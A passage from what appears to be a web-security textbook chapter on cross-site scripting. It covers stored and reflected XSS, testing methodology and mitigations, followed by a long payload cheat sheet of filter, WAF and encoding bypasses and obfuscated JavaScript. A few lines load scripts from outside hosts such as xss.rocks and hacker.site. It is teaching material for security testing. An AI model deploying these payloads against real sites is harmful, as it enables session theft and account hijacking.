application functions, such as comments on blog posts. When the submitted value is observed 
in a response, you need to determine whether the data is indeed being stored across different 
requests, as opposed to being simply reflected in the immediate response. 
When you have identified links between entry and exit points in the application's processing, 
each link needs to be specifically tested to detect if a stored XSS vulnerability is present. This 
involves determining the context within the response where the stored data appears and 
testing suitable candidate XSS payloads that are applicable to that context. At this point, the 
testing methodology is broadly the same as for finding reflected XSS vulnerabilities. 
https://portswigger.net/web-security/cross-site-scripting/stored 
https://portswigger.net/web-security/cross-site-scripting/reflected  
https://owasp.org/www-community/attacks/xss/ 
Reflected XSS in Depth: 
[[ PAGE 196 ]]
• 
Reflected Cross-Site Scripting is the type in which the injected script is reflected off the 
webserver, like the error message, search result, or any other response. Reflected type 
attacks are delivered to victims or targets via another path such as email messages or 
phishing. When the user is tricked into clicking the malicious script or link, then this 
attack triggers the user’s browser. A simple example of Reflected XSS is the search 
field. 
• 
An attacker looks for places where user input is used directly to generate a response to 
launch a successful Reflected XSS attack. This often involves elements that are not 
expected to host scripts, such as image tags (<img>), or the addition of event 
attributes such as onload and onmouseover. These elements are often not subject to 
the same input validation, output encoding, and other content filtering and checking 
routines. 
 
Steps of Reflected XSS 
 
  
In the above figure: 
• 
The attacker sends a link that contains malicious JavaScript code. 
• 
Malicious Link is executed in normal users at his side on any specific browser. 
• 
After execution, the sensitive data like cookies or session ID is being sent back to the 
attacker and the normal user is compromised. 
Example 1: Consider a web application that takes search string from the user via the search 
parameter provided on the query string. 
http://target.com/aform.html?search=Gaurav 
[[ PAGE 197 ]]
The application server wants to show the search value which is provided by the user on the 
HTML page. In this case, PHP is used to pull the value from the URL and generate the result 
HTML 
<?php echo ‘You Searched: ‘ . $_GET[“search”]; ?> 
Check how the input provided by the user in the URL is directly passed forward with no input 
validation performed and no output encoding in place. A malicious script thus can be formed 
such that if a victim clicks on the URL, a malicious script would then be executed by the 
victim’s browser and send the session values to the attacker.  
http://target.com/aform.html?search=<script>alert(‘XSS by Gaurav’);</script> 
  
Example 2: Reflected XSS can also occur when an application employs a dynamic page to 
display error messages to users. Basically, the page takes an input parameter containing the 
message’s text and simply displays this text back to the user within the response.  
Consider the following URL, which returns the error message 
http://target.com/error/5/Error.ashx?message=Sorry%2c+an+error+occurred 
If we check the HTML source for the returned page, the application simply copies the value of 
the message parameter in the URL and inserts it into the error page at a suitable place. 
<p>Sorry, an error occurred.</p> 
As there is no sanitization and validation performed for the error message attacker can easily 
insert the malicious script which generates a pop-up dialog. 
http://target.com/error/5/Error.ashx?message=<script>alert(“XSS by GAURAV”)</script> 
Requesting this link generates an HTML response page that contains the following in place of 
the original message. 
<p><script>alert(“XSS by GAURAV”);</script></p> 
Mitigations: 
• 
Try to use browser technologies that do not allow client-side scripting in input fields or 
URLs. 
• 
Use strict type character and encoding enforcement to avoid XSS. 
• 
Make sure that all the user-supplied inputs are adequately validated before sending 
them to the server. 
Impact of Reflected XSS: 
• 
The attacker can hijack user accounts. 
• 
An attacker could steal credentials. 
• 
An attacker could exfiltrate sensitive data. 
• 
An attacker can steal cookies and Sessions. 
• 
An attacker can quickly obtain access to your other client’s computers. 
[[ PAGE 198 ]]
Methodology 
Check if any value you control (parameters, path, headers?, cookies?) is being reflected in the 
HTML or used by JS code. 
Find the context where it's reflected/used. 
If reflected 
Check which symbols can you use and depending on that, prepare the payload: 
In raw HTML: 
Can you create new HTML tags? 
Can you use events or attributes supporting javascript: protocol? 
Can you bypass protections? 
Is the HTML content being interpreted by any client side JS engine (AngularJS, VueJS, Mavo...), 
you could abuse a Client Side Template Injection. 
If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - 
HTML scriptless injection? 
Inside a HTML tag: 
Can you exit to raw HTML context? 
Can you create new events/attributes to execute JS code? 
Does the attribute where you are trapped support JS execution? 
Can you bypass protections? 
Inside JavaScript code: 
Can you escape the <script> tag? 
Can you escape the string and execute different JS code? 
Are your input in template literals ``? 
Can you bypass protections? 
If used: 
You could exploit a DOM XSS, pay attention how your input is controlled and if your controlled 
input is used by any sink. 
Reflected values 
In order to successfully exploit a XSS the first thing you need to find is a value controlled by you 
that is being reflected in the web page. 
Intermediately reflected: If you find that the value of a parameter or even the path is being 
reflected in the web page you could exploit a Reflected XSS. 
Stored and reflected: If you find that a value controlled by you is saved in the server and is 
reflected every time you access a page you could exploit a Stored XSS. 
[[ PAGE 199 ]]
Accessed via JS: If you find that a value controlled by you is being access using JS you could 
exploit a DOM XSS. 
Contexts 
When trying to exploit a XSS the first thing you need to know if where is your input being 
reflected. Depending on the context, you will be able to execute arbitrary JS code on different 
ways. 
Raw HTML 
If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order 
to execute JS code: <img , <iframe , <svg , <script ... these are just some of the many possible 
HTML tags you could use. 
Also, keep in mind Client Side Template Injection. 
Inside HTML tags attribute 
If your input is reflected inside the value of the attribute of a tag you could try: 
To escape from the attribute and from the tag (then you will be in the raw HTML) and create 
new HTML tag to abuse: "><img [...] 
If you can escape from the attribute but not from the tag (> is encoded or deleted), depending 
on the tag you could create an event that executes JS code: " autofocus onfocus=alert(1) x=" 
If you cannot escape from the attribute (" is being encoded or deleted), then depending on 
which attribute your value is being reflected in if you control all the value or just a part you will 
be able to abuse it. For example, if you control an event like onclick= you will be able to make 
it execute arbitrary code when it's clicked. Another interesting example is the attribute href, 
where you can use the javascript: protocol to execute arbitrary code: href="javascript:alert(1)" 
If your input is reflected inside "unexpoitable tags" you could try the accesskey trick to abuse 
the vuln (you will need some kind of social engineer to exploit this): " accesskey="x" 
onclick="alert(1)" x=" 
Inside JavaScript code 
In this case your input is reflected between <script> [...] </script> tags of a HTML page, inside a 
**.js**file or inside an attribute using javascript: protocol: 
If reflected between <script> [...] </script> tags, even if your input if inside any kind of quotes, 
you can try to inject </script> and escape from this context. This works because the browser 
will first parse the HTML tags and then the content, therefore, it won't notice that your 
injected </script> tag is inside the HTML code. 
If reflected inside a JS string and the last trick isn't working you would need to exit the string, 
execute your code and reconstruct the JS code (if there is any error, it won't be executed: 
'-alert(1)-' 
';-alert(1)// 
\';alert(1)// 
[[ PAGE 200 ]]
If reflected inside template literals `` you can embed JS expressions using ${ ... } syntax: `var 
greetings =Hello, ${alert(1)}``` 
DOM 
There is JS code that is using unsafely some data controlled by an attacker like location.href . 
An attacker, could abuse this to execute arbitrary JS code. 
 
Universal XSS 
These kind of XSS can be found anywhere. They not depend just on the client exploitation of a 
web application but on any context. These kind of arbitrary JavaScript execution can even be 
abuse to obtain RCE, read arbitrary files in clients and servers, and more. 
Some examples: 
 
 
WAF bypass encoding image 
 
Injecting inside raw HTML 
When your input is reflected inside the HTML page or you can escape and inject HTML code in 
this context the first thing you need to do if check if you can abuse < to create new tags: Just 
try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected 
without changes. Only in the last case you will be able to exploit this case. 
For this cases also keep in mind Client Side Template Injection. 
Note: A HTML comment can be closed using**** --> or ****--!> 
In this case and if no black/whitelisting is used, you could use payloads like: 
<script>alert(1)</script> 
<img src=x onerror=alert(1) /> 
<svg onload=alert('XSS')> 
But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags 
you can create. 
Once you have located which tags are allowed, you would need to brute-force 
attributes/events inside the found valid tags to see how you can attack the context. 
Tags/Events brute-force 
Go to https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and click on Copy 
tags to clipboard. Then, send all of them using Burp intruder and check if any tags wasn't 
discovered as malicious by the WAF. Once you have discovered which tags you can use, you 
can brute force all the events using the valid tags (in the same web page click on Copy events 
to clipboard and follow the same procedure as before). 
[[ PAGE 201 ]]
Custom tags 
If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS 
code with the onfocus attribute. In the XSS request, you need to end the URL with # to make 
the page focus on that object and execute the code: 
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x 
Blacklist Bypasses 
If some kind of blacklist is being used you could try to bypass it with some silly tricks: 
//Random capitalization 
<script> --> <ScrIpT> 
<img --> <ImG 
 
//Double tag, in case just the first match is removed 
<script><script> 
<scr<script>ipt> 
<SCRscriptIPT>alert(1)</SCRscriptIPT> 
 
//You can substitude the space to separate attributes for: 
/ 
/*%00/ 
/%00*/ 
%2F 
%0D 
%0C 
%0A 
%09 
 
//Unexpected parent tags 
<svg><x><script>alert('1'&#41</x> 
 
//Unexpected weird attributes 
<script x> 
<script a="1234"> 
[[ PAGE 202 ]]
<script ~~~> 
<script/random>alert(1)</script> 
<script      ///Note the newline 
>alert(1)</script> 
<scr\x00ipt>alert(1)</scr\x00ipt> 
 
//Not closing tag, ending with " <" or " //" 
<iframe SRC="javascript:alert('XSS');" < 
<iframe SRC="javascript:alert('XSS');" // 
 
//Extra open 
<<script>alert("XSS");//<</script> 
 
//Just weird an unexpected, use your imagination 
<</script/script><script> 
<input type=image src onerror="prompt(1)"> 
 
//Using `` instead of parenthesis 
onerror=alert`1` 
 
//Use more than one 
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` // 
Length bypass (small XSSs) 
More tiny XSS for different environments payload can be found here and here. 
<!-- Taken from the blog of Jorge Lajara --> 
<svg/onload=alert``> 
<script src=//aa.es> 
<script src=//℡㏛.pw> 
The last one is using 2 unicode characters which expands to 5: telsr 
More of these characters can be found here. 
To check in which characters are decomposed check here. 
[[ PAGE 203 ]]
Click XSS - Clickjacking 
If in order to exploit the vulnerability you need the user to click a link or a form with 
prepopulated data you could try to abuse Clickjacking (if the page is vulnerable). 
Impossible - Dangling Markup 
If you just think that it's impossible to create an HTML tag with an attribute to execute JS code, 
you should check Danglig Markup because you could exploit the vulnerability without 
executing JS code. 
Injecting inside HTML tag 
Inside the tag/escaping from attribute value 
If you are in inside a HTML tag, the first thing you could try is to escape from the tag and use 
some of the techniques mentioned in the previous section to execute JS code. 
If you cannot escape from the tag, you could create new attributes inside the tag to try to 
execute JS code, for example using some payload like (note that in this example double quotes 
are use to escape from the attribute, you won't need them if your input is reflected directly 
inside the tag): 
" autofocus onfocus=alert(document.domain) x=" 
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t 
Style events 
<p style="animation: x;" onanimationstart="alert()">XSS</p> 
<p style="animation: x;" onanimationend="alert()">XSS</p> 
 
#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is 
clicked: 
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 
5000;" onclick="alert(1)"></div> 
#moving your mouse anywhere over the page (0-click-ish): 
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 
5000;" onmouseover="alert(1)"></div> 
Within the attribute 
Even if you cannot escape from the attribute (" is being encoded or deleted), depending on 
which attribute your value is being reflected in if you control all the value or just a part you will 
be able to abuse it. For example, if you control an event like onclick= you will be able to make 
it execute arbitrary code when it's clicked. 
Another interesting example is the attribute href, where you can use the javascript: protocol to 
execute arbitrary code: href="javascript:alert(1)" 
Bypass inside event using HTML encoding/URL encode 
[[ PAGE 204 ]]
The HTML encoded characters inside the value of HTML tags attributes are decoded on 
runtime. Therefore something like the following will be valid (the payload is in bold): <a 
id="author" href="http://none" onclick="var tracker='http://foo?&apos;-alert(1)-&apos;';">Go 
Back </a> 
Note that any kind of HTML encode is valid: 
//HTML entities 
&apos;-alert(1)-&apos; 
//HTML hex without zeros 
&#x27-alert(1)-&#x27 
//HTML hex with zeros 
&#x00027-alert(1)-&#x00027 
//HTML dec without zeros 
&#39-alert(1)-&#39 
//HTML dec with zeros 
&#00039-alert(1)-&#00039 
 
<a href="javascript:var a='&apos;-alert(1)-&apos;'"> 
Note that URL encode will also work: 
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a> 
Bypass inside event using Unicode encode 
//For some reason you can use unicode to encode "alert" but not "(1)" 
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) /> 
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) /> 
Special Protocols Within the attribute 
There you can use the protocols javascript: or data: in some places to execute arbitrary JS 
code. Some will require user interaction on some won't. 
javascript:alert(1) 
JavaSCript:alert(1) 
javascript:%61%6c%65%72%74%28%31%29 //URL encode 
javascript&colon;alert(1) 
javascript&#x003A;alert(1) 
javascript&#58;alert(1) 
[[ PAGE 205 ]]
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1) 
java        //Note the new line  
script:alert(1) 
 
data:text/html,<script>alert(1)</script> 
DaTa:text/html,<script>alert(1)</script> 
data:text/html;charset=iso-8859-
7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69
%70%74%3e 
data:text/html;charset=UTF-8,<script>alert(1)</script> 
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4= 
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg 
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH 
A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv 
MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs 
aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw 
IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh 
TUyIpOzwvc2NyaXB0Pjwvc3ZnPg== 
Places where you can inject these protocols 
In general the javascript: protocol can be used in any tag that accepts the attribute href and in 
most of the tags that accepts the attribute src (but not <img) 
<a href="javascript:alert(1)"> 
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="> 
<form action="javascript:alert(1)"><button>send</button></form> 
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button> 
<object data=javascript:alert(3)> 
<iframe src=javascript:alert(2)> 
<embed src=javascript:alert(1)> 
 
<object data="data:text/html,<script>alert(5)</script>"> 
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" 
type="image/svg+xml" AllowScriptAccess="always"></embed> 
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH 
A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv 
MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs 
[[ PAGE 206 ]]
aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw 
IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh 
TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed> 
<iframe src="data:text/html,<script>alert(5)</script>"></iframe> 
 
//Special cases 
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf  
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> 
//https://github.com/evilcos/xss.swf  
<iframe srcdoc="<svg onload=alert(4);>"> 
Other obfuscation tricks 
In this case the HTML encoding and the Unicode encoding trick from the previous section is 
also valid as you are inside an attribute. 
<a href="javascript:var a='&apos;-alert(1)-&apos;'"> 
Moreover, there is another nice trick for these cases**: Even if your input inside javascript:... is 
being URL encoded, it will be URL decoded before it's executed.** So, if you need to escape 
from the string using a single quote and you see that it's being URL encoded, remember that it 
doesn't matter, it will be interpreted as a single quote during the execution time. 
&apos;-alert(1)-&apos; 
%27-alert(1)-%27 
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe> 
Note that if you try to use both URLencode + HTMLencode in any order to encode the payload 
it won't work, but you can mix them inside the payload. 
Using Hex and Octal encode with javascript: 
You can use Hex and Octal encode inside the src attribute of iframe (at least) to declare HTML 
tags to execute JS: 
//Encoded: <svg onload=alert(1)> 
// This WORKS 
<iframe 
src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28
\x31\x29\x3e' /> 
<iframe 
src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50
\61\51\76' /> 
 
//Encoded: alert(1) 
[[ PAGE 207 ]]
// This doesn't work 
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' /> 
<svg onload=javascript:'\141\154\145\162\164\50\61\51' /> 
Reverse tab nabbing 
<a target="_blank" rel="opener" 
If you can inject any URL in an arbitrary <a href= tag that contains the target="_blank" and 
rel="opener" attributes, check the following page to exploit this behavior: 
 
on Event Handlers Bypass 
First of all check this page (https://portswigger.net/web-security/cross-site-scripting/cheat-
sheet) for useful "on" event handlers. 
In case there is some blacklist preventing you from creating this even handlers you can try the 
following bypasses: 
<svg onload%09=alert(1)> //No safari 
<svg %09onload=alert(1)> 
<svg %09onload%20=alert(1)> 
<svg onload%09%20%28%2c%3b=alert(1)> 
 
//chars allowed between the onevent and the "=" 
IExplorer: %09 %0B %0C %020 %3B 
Chrome: %09 %20 %28 %2C %3B 
Safari: %2C %3B 
Firefox: %09 %20 %28 %2C %3B 
Opera: %09 %20 %2C %3B 
Android: %09 %20 %28 %2C %3B 
XSS in "Unexploitable tags" (input hidden, link, canonical) 
From here: 
You can execute an XSS payload inside a hidden attribute, provided you can persuade the 
victim into pressing the key combination. On Firefox Windows/Linux the key combination is 
ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a 
different key in the access key attribute. Here is the vector: 
<input type="hidden" accesskey="X" onclick="alert(1)"> 
The XSS payload will be something like this: " accesskey="x" onclick="alert(1)" x=" 
[[ PAGE 208 ]]
Blacklist Bypasses 
Several tricks with using different encoding were exposed already inside this section. Go back 
to learn where can you use HTML encoding, Unicode encoding, URL encoding, Hex and Octal 
encoding and even data encoding. 
Bypasses for HTML tags and attributes 
Read the Blacklist Bypasses of the previous section. 
Bypasses for JavaScript code 
Read the JavaScript bypass blacklist of the following section. 
CSS-Gadgets 
If you found a XSS in a very small part of the web that requires some kind of interaction 
(maybe a small link in the footer with an onmouseover element), you can try to modify the 
space that element occupies to maximize the probabilities of have the link fired. 
For example, you could add some styling in the element like: position: fixed; top: 0; left: 0; 
width: 100%; height: 100%; background-color: red; opacity: 0.5 
But, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, 
for example 
.test {display:block; color: blue; width: 100%} 
and 
#someid {top: 0; font-family: Tahoma;} 
Now you can modify our link and bring it to the form 
<a href=”” id=someid class=test onclick=alert() a=””> 
This trick was taken from https://medium.com/@skavans_/improving-the-impact-of-a-mouse-
related-xss-with-styling-and-css-gadgets-b1e5dec2f703 
Injecting inside JavaScript code 
In these case you input is going to be reflected inside the JS code of a .js file or between 
<script>...</script> tags or between HTML events that can execute JS code or between 
attributes that accepts the javascript: protocol. 
Escaping <script> tag 
If your code is inserted within <script> [...] var input = 'reflected data' [...] </script> you could 
easily escape closing the <script> tag: 
</script><img src=1 onerror=alert(document.domain)> 
Note that in this example we haven't even closed the single quote, but that's not necessary as 
the browser first performs HTML parsing to identify the page elements including blocks of 
script, and only later performs JavaScript parsing to understand and execute the embedded 
scripts. 
Inside JS code 
[[ PAGE 209 ]]
If <> are being sanitised you can still escape the string where your input is being located and 
execute arbitrary JS. It's important to fix JS syntax, because if there are any errors, the JS code 
won't be executed: 
'-alert(document.domain)-' 
';alert(document.domain)// 
\';alert(document.domain)// 
Template literals `` 
In order to construct strings apart from single and double quotes JS also accepts backticks `` . 
This is known as template literals as they allow to embedded JS expressions using ${ ... } 
syntax. 
Therefore, if you find that your input is being reflected inside a JS string that is using backticks, 
you can abuse the syntax ${ ... } to execute arbitrary JS code: 
This can be abused using: ${alert(1)} 
Encoded code execution 
<script>\u0061lert(1)</script> 
<svg><script>alert&lpar;'1'&rpar; 
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- 
The svg tags are neccesary 
<iframe 
srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>"> 
JavaScript bypass blacklists techniques 
Strings 
"thisisastring" 
'thisisastrig' 
`thisisastring` 
/thisisastring/ == "/thisisastring/" 
/thisisastring/.source == "thisisastring" 
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103) 
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67" 
"\164\150\151\163\151\163\141\163\164\162\151\156\147" 
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067
" 
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}" 
"\a\l\ert\(1\)" 
[[ PAGE 210 ]]
atob("dGhpc2lzYXN0cmluZw==") 
eval(8680439..toString(30))(983801..toString(36)) 
Space substitutions inside JS code 
<TAB> 
/**/ 
JavaScript without parentheses 
alert`1` 
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'"> 
eval.call`${'alert\x2823\x29'}` 
eval.apply`${[`alert\x2823\x29`]}` 
https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md 
https://portswigger.net/research/javascript-without-parentheses-using-dommatrix 
JavaScript comments (from JavaScript Comments trick) 
//This is a 1 line comment 
/* This is a multiline comment*/ 
#!This is a 1 line comment, but "#!" must to be at the beggining of the line 
-->This is a 1 line comment, but "-->" must to be at the beggining of the line 
JavaScript new lines (from JavaScript new line trick) 
//Javascript interpret as new line these chars: 
String.fromCharCode(10) //0x0a 
String.fromCharCode(13) //0x0d 
String.fromCharCode(8232) //0xe2 0x80 0xa8 
String.fromCharCode(8233) //0xe2 0x80 0xa8 
Arbitrary function (alert) call 
//Eval like functions 
eval('ale'+'rt(1)') 
setTimeout('ale'+'rt(2)'); 
setInterval('ale'+'rt(10)'); 
Function('ale'+'rt(10)')``; 
[].constructor.constructor("alert(document.domain)")`` 
[]["constructor"]["constructor"]`$${alert()}``` 
[[ PAGE 211 ]]
 
//General function executions 
`` //Can be use as parenthesis 
alert`document.cookie` 
alert(document['cookie'])  
with(document)alert(cookie)  
(alert)(1) 
(alert(1))in"." 
a=alert,a(1) 
[1].find(alert) 
window['alert'](0) 
parent['alert'](1) 
self['alert'](2) 
top['alert'](3) 
this['alert'](4) 
frames['alert'](5) 
content['alert'](6) 
[7].map(alert) 
[8].find(alert) 
[9].every(alert) 
[10].filter(alert) 
[11].findIndex(alert) 
[12].forEach(alert); 
top[/al/.source+/ert/.source](1) 
top[8680439..toString(30)](1) 
Function("ale"+"rt(1)")(); 
new Function`al\ert\`6\``; 
Set.constructor('ale'+'rt(13)')(); 
Set.constructor`al\x65rt\x2814\x29```; 
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y) 
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y)) 
[[ PAGE 212 ]]
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array) 
globalThis[`al`+/ert/.source]`1` 
this[`al`+/ert/.source]`1` 
[alert][0].call(this,1) 
window['a'+'l'+'e'+'r'+'t']() 
window['a'+'l'+'e'+'r'+'t'].call(this,1) 
top['a'+'l'+'e'+'r'+'t'].apply(this,[1]) 
(1,2,3,4,5,6,7,8,alert)(1) 
x=alert,x(1) 
[1].find(alert) 
top["al"+"ert"](1) 
top[/al/.source+/ert/.source](1) 
al\u0065rt(1) 
al\u0065rt`1` 
top['al\145rt'](1) 
top['al\x65rt'](1) 
top[8680439..toString(30)](1) 
<svg><animate onbegin=alert() attributeName=x></svg> 
DOM vulnerabilities 
There is JS code that is using unsafely data controlled by an attacker like location.href . An 
attacker, could abuse this to execute arbitrary JS code. 
Due to the extension of the explanation of DOM vulnerabilities it was moved to this page: 
 
There you will find a detailed explanation of what DOM vulnerabilities are, how are they 
provoked, and how to exploit them. 
Also, don't forget that at the end of the mentioned post you can find an explanation about 
DOM Clobbering attacks. 
Other Bypasses 
Normalised Unicode 
You could check is the reflected values are being unicode normalized in the server (or in the 
client side) and abuse this functionality to bypass protections. Find an example here. 
PHP FILTER_VALIDATE_EMAIL flag Bypass 
[[ PAGE 213 ]]
"><svg/onload=confirm(1)>"@x.y 
Ruby-On-Rails bypass 
Due to RoR mass assignment quotes are inserted in the HTML and then the quote restriction is 
bypassed and additoinal fields (onfocus) can be added inside the tag. 
Form example (from this report), if you send the payload: 
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa 
The pair "Key","Value" will be echoed back like this: 
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"} 
Then, the onfocus attribute will be inserted: 
 
A XSS occurs. 
Special combinations 
<iframe/src="data:text/html,<svg onload=alert(1)>"> 
<input type=image src onerror="prompt(1)"> 
<svg onload=alert(1)// 
<img src="/" =_=" title="onerror='prompt(1)'"> 
<img src='1' onerror='alert(0)' < 
<script x> alert(1) </script 1=2 
<script x>alert('XSS')<script y> 
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;// 
<svg////////onload=alert(1)> 
<svg id=x;onload=alert(1)> 
<svg id=`x`onload=alert(1)> 
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)> 
<script>$=1,alert($)</script> 
<script ~~~>confirm(1)</script ~~~> 
<script>$=1,\u0061lert($)</script> 
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script> 
<</script/script><script ~~~>\u0061lert(1)</script ~~~> 
</style></scRipt><scRipt>alert(1)</scRipt> 
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)> 
[[ PAGE 214 ]]
<svg><x><script>alert('1'&#41</x> 
<iframe src=""/srcdoc='<svg onload=alert(1)>'> 
<svg><animate onbegin=alert() attributeName=x></svg> 
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)> 
<img src=1 
onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.ap
pendChild(s);" 
XSS with header injection in a 302 response 
If you find that you can inject headers in a 302 Redirect response you could try to make the 
browser execute arbitrary JavaScript. This is not trivial as modern browsers do not interpret 
the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting 
payload is useless. 
In this report and this one you can read how you can test several protocols inside the Location 
header and see if any of them allows the browser to inspect and execute the XSS payload 
inside the body. 
Past known protocols: mailto://, //x:1/, ws://, wss://, empty Location header, resource://. 
Obfuscation & Advanced Bypass 
https://github.com/aemkei/katakana.js 
https://ooze.ninja/javascript/poisonjs 
https://javascriptobfuscator.herokuapp.com/ 
https://skalman.github.io/UglifyJS-online/ 
http://www.jsfuck.com/ 
More sofisticated JSFuck: https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-
pro-xss-advanced-methods-daf7a82673ce 
http://utf-8.jp/public/jjencode.html 
https://utf-8.jp/public/aaencode.html 
//Katana 
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+
ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script> 
//JJencode  
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]
+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};
$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$
.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$
._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\
\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script> 
[[ PAGE 215 ]]
//JSFuck 
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]
+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[
])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(
![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]
+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]
+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[
